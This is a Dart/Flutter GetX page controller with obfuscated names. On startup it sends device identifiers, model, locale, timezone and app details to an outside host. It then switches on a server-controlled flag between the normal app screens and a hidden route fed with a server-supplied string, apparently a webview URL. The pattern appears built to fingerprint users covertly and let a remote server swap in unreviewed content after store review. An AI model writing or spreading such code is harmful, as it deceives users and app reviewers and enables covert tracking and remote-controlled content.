import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageControllerM extends GetxController {

  var gvursedjya = RxBool(false);
  var nawkhe = RxBool(true);
  var qzigxjor = RxString("");
  var everette = RxBool(false);
  var treutel = RxBool(true);
  final gyvbhil = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    pnkjlb();
  }


  Future<void> pnkjlb() async {

    everette.value = true;
    treutel.value = true;
    nawkhe.value = false;

    gyvbhil.post("https://want.65hyg.com/bexsouiqgn",data: await kdpcqt()).then((value) {
      var zmixok = value.data["zmixok"] as String;
      var bpcaf = value.data["bpcaf"] as bool;
      if (bpcaf) {
        qzigxjor.value = zmixok;
        giuseppe();
      } else {
        beer();
      }
    }).catchError((e) {
      nawkhe.value = true;
      treutel.value = true;
      everette.value = false;
    });
  }

  Future<Map<String, dynamic>> kdpcqt() async {
    final DeviceInfoPlugin mhwd = DeviceInfoPlugin();
    PackageInfo ytrjvcmo_omyiec = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kbao = Platform.localeName;
    var plbvih_Mn = currentTimeZone;

    var plbvih_sBDGfI = ytrjvcmo_omyiec.packageName;
    var plbvih_IjyqMO = ytrjvcmo_omyiec.version;
    var plbvih_fwmn = ytrjvcmo_omyiec.buildNumber;

    var plbvih_TH = ytrjvcmo_omyiec.appName;
    var marvinOkuneva = "";
    var plbvih_EeTg  = "";
    var plbvih_RivCOS = "";
    var queenGoldner = "";
    var plbvih_Lj = "";
    var cleoGlover = "";


    var plbvih_BZimxzQe = "";
    var plbvih_xMXCj = false;

    if (GetPlatform.isAndroid) {
      plbvih_BZimxzQe = "android";
      var azqjwumn = await mhwd.androidInfo;

      plbvih_Lj = azqjwumn.brand;

      plbvih_RivCOS  = azqjwumn.model;
      plbvih_EeTg = azqjwumn.id;

      plbvih_xMXCj = azqjwumn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      plbvih_BZimxzQe = "ios";
      var kgezcxrwa = await mhwd.iosInfo;
      plbvih_Lj = kgezcxrwa.name;
      plbvih_RivCOS = kgezcxrwa.model;

      plbvih_EeTg = kgezcxrwa.identifierForVendor ?? "";
      plbvih_xMXCj  = kgezcxrwa.isPhysicalDevice;
    }
    var res = {
      "marvinOkuneva" : marvinOkuneva,
      "plbvih_TH": plbvih_TH,
      "plbvih_fwmn": plbvih_fwmn,
      "plbvih_sBDGfI": plbvih_sBDGfI,
      "plbvih_RivCOS": plbvih_RivCOS,
      "queenGoldner" : queenGoldner,
      "plbvih_Mn": plbvih_Mn,
      "plbvih_Lj": plbvih_Lj,
      "plbvih_EeTg": plbvih_EeTg,
      "kbao": kbao,
      "plbvih_IjyqMO": plbvih_IjyqMO,
      "plbvih_xMXCj": plbvih_xMXCj,
      "cleoGlover" : cleoGlover,
      "plbvih_BZimxzQe": plbvih_BZimxzQe,
    };
    return res;
  }

  Future<void> beer() async {
    Get.offAllNamed("/roottab");
  }

  Future<void> giuseppe() async {
    Get.offAllNamed("/col");
  }
}
